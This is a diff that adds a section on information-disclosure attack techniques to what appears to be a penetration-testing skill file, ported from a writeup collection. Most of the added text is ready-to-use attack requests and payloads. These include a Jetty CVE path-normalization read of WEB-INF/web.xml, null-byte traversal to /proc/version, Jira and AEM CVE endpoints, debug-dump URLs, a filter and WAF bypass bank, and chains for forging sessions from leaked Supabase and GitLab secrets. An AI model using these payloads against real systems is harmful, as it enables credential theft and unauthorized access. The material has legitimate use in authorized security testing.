@@ -201,3 +201,65 @@ Information leaks accelerate exploitation by revealing code, configuration, iden
 ## Summary
 
 Information disclosure is an amplifier. Convert leaks into precise, minimal exploits or clear architectural risks.
+
+
+## Additional Techniques — ported from WebSkills (writeup-techniques/info-disclosure)
+
+### App-server source read via path normalization (WEB-INF / servlet source)
+Read `WEB-INF/web.xml` (DB creds, servlet mappings, hidden admin paths) and raw servlet/CGI source by abusing path-normalization quirks — distinct from DVCS/backup artifact dumping.
+```
+GET /%2e/WEB-INF/web.xml HTTP/1.1                                   # Jetty CVE-2021-28164
+/resin-doc/viewfile/?contextpath=/&servletpath=&file=WEB-INF/web.xml # Caucho Resin
+<script>.cgi%3F                                                     # Apache CGI source disclosure (append %3F)
+/cgi-bin/pdesk.cgi?lang=../../../../../../proc/version%00           # null-byte legacy source read
+```
+
+### TRACE / method-override to leak proxy-injected internal headers
+Reverse proxies append internal auth headers that echo back in a TRACE response — not covered by the fork's header-fingerprinting section.
+```
+TRACE / HTTP/1.1        # echoes request incl. internal headers the proxy added
+# also try: OPTIONS, X-HTTP-Method-Override when GET is filtered
+```
+
+### Adobe AEM disclosure surface
+```
+/crx/de                 /bin/querybuilder.json     /system/console
+```
+`QueryBuilder` / DefaultGetServlet dump the JCR tree, users, and paths. Dispatcher blocks `/crx` etc. → bypass with `;`-tricks / extension confusion to reach the servlet.
+
+### Sentry instance misconfig
+Public Sentry instance/issues leak source, DSN, and env vars; Sentry can also be a blind-SSRF pivot (NordVPN). Distinct third-party surface not in fork.
+
+### Jira user-enumeration CVEs (concrete endpoints)
+```
+GET /rest/api/latest/groupuserpicker?query=admin     # CVE-2019-8449
+POST /secure/QueryComponent!Jql.jspa                  # Jira 8.11–8.15, CVE-2020-14181
+```
+
+### Supabase frontend-key exposure → total RLS bypass
+A `service_role` key (or `JWT_SECRET`) shipped in frontend JS bypasses ALL Row-Level Security → full DB read/write and forge any user's token. Also `PUBLIC_BUCKET` / `STORAGE_NO_RLS` storage misconfig. Higher-impact than a generic leaked API key.
+
+### Product-specific debug endpoints
+```
+awstats.pl?debug=1        (AWStats)
+/cutenews/index.php?debug (CuteNews → phpinfo dump)
+/webcgi/webbatch.exe?dumpinputdata
+?debug   ?debug=1   ?debug=2
+```
+
+### GitLab `secret_key_base` disclosure → session/cookie forgery
+`secret_key_base` leaked via crafted encoding chars ($3500) lets an attacker forge signed session cookies / signed tokens — a specific secret→ATO chain beyond generic "key → cloud access."
+
+### Disclosure-specific filter/WAF bypass bank
+For reaching blocked internal/config paths and dodging extension filters:
+```
+..;/    %2e%2e/    trailing %3F    %00 (null byte)
+case / extension variation: .ENV  %2egit  file.php.bak  file.php~  file.php.swp
+HTTP method swap when GET filtered: TRACE / OPTIONS / DEBUG / X-HTTP-Method-Override
+```
+
+### Diff-based confirmation (avoid custom-404 false positives)
+Request a known-nonexistent path vs the target file; `200` + real content (not the styled 404 body) confirms exposure. For `.git`, confirm `/.git/HEAD` returns `ref: refs/heads/…` before claiming a dump.
+
+### Client-side / deeplink / Wayback-archived-token leaks
+Insecure deeplinks return PII directly (Grab), path-traversal in a deeplink query reaches private info (Basecamp), and Wayback/CDN-cached responses preserve one-time tokens (Omise email-confirmation token via Wayback) — an archival channel that widens exposure even after the app is fixed.
